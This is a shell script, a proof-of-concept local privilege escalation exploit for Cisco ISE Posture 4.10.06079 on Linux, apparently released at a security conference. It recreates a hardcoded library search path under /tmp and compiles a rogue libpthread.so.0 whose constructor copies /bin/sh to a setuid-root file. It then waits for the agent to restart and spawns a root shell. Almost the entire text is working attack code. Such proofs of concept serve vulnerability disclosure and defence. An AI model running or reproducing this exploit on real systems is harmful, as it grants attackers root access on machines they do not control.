#!/bin/sh
die() {
  echo "$1"
  exit 1
}
cat <<EOF
***************************************************************
* THIS IS PROOF OF CONCEPT EXPLOIT FOR ISE POSTURE 4.10.06079 *
*                                                             *
*    FIRST RELEASE ON BEHIND THE CODE 2024, LIMASSOL, CYPRUS  *
*                                                             *
*           DO NOT USE FOR MALICIOUS ACTIVITY                 *
***************************************************************
EOF

read C


test -e /opt/cisco/anyconnect/bin/aciseagentd || die "Cisco ISE Posture module has not been installed"
grep -q '/tmp/build/thehoff/Phoenix_MR60.126653971381/Phoenix_MR6/published/openssl/lib/linux.3_10.x86_64' /opt/cisco/anyconnect/bin/aciseagentd || die "Cisco ISE Posture version is not vulnerable"

echo "[++] Vulnerable version detected, preparing the environment"

mkdir -p /tmp/build/thehoff/Phoenix_MR60.126653971381/Phoenix_MR6/published/openssl/lib/linux.3_10.x86_64

cat > /tmp/build/thehoff/Phoenix_MR60.126653971381/Phoenix_MR6/published/openssl/lib/linux.3_10.x86_64/fake.c <<EOF
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor)) void lib_init(void) {
    printf("(stdio) bad library loaded\n");
    fprintf(stderr, "(stderr) bad library loaded\n");
    system("cp /bin/sh /.rootsh");
    system("chmod 755 /.rootsh");
    system("chmod u+s /.rootsh");
}
EOF
gcc -fPIC -shared /tmp/build/thehoff/Phoenix_MR60.126653971381/Phoenix_MR6/published/openssl/lib/linux.3_10.x86_64/fake.c -o /tmp/build/thehoff/Phoenix_MR60.126653971381/Phoenix_MR6/published/openssl/lib/linux.3_10.x86_64/libpthread.so.0 -Wl,-soname=libpthread.so.0

echo "[++] Environment ready. Waiting for vpnagentd to restart..."
while true; do
  test -e /.rootsh && /.rootsh -p
  sleep 30
done
